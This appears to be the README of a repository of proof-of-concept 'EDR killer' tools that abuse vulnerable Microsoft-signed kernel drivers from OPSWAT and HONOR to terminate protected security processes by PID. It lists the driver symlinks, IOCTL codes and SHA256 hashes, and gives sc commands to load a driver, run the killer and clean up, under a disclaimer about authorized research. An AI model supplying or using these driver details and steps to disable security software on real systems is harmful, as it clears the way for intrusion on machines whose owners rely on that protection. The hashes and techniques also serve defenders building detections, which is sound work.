##TheKiller


This repo is the result of hunting and reversing vulnerable signed kernel drivers for over a year. Every killer here abuses a legitimate driver to terminate any process from kernel mode, PPL-protected or not. Works on EDR/AV protected processes.

Each POC does a simple process kill by PID, you just customize it to whatever EDR process you want dead and it handles the rest from kernel. New ones get dropped as they get reversed.

## Killers

| # | Name | Vendor | SymLink | IOCTL | Signer | Date |
|---|------|--------|-------|-------|--------|-----|-----|
| 1 | libwasys.sys | OPSWAT | \\\\.\WasysControl | `0x22E00C` | Microsoft | 18/10/2026 |
| 2 | MonProcessControl.sys | HONOR | \\\\.\MonProcessControl | `0x22400C` | Microsoft | 18/10/2026 |

## Loading

```
sc create DriverName type= kernel binPath= C:\path\to\driver.sys
sc start DriverName
```

Running:

```
killer_poc.exe <PID>
```
Cleanup:

```
sc stop DriverName
sc delete DriverName
```


## Driver Hashes

| # | Driver | SHA256 |
|---|--------|--------|
| 1 | libwasys.sys | `04fda396f42384d9295fe306336ee4a685a0c341debdc27ddf9169f0336b46a6` |
| 2 | MonProcessControl.sys | `0e1cc4f205ddc6b78578de2da209ba3ba1f16fac482f4042bbd02036fc470f04` |

## Disclaimer

Everything in this repository is published for educational and authorized security research purposes only. These tools and drivers exist to help defenders understand how BYOVD attacks work in practice so they can build better detections and block rules. Do not use any of this against systems you do not own or do not have explicit written authorization to test. The author takes no responsibility for misuse. If you use this to break something you shouldn't be touching, that's on you.
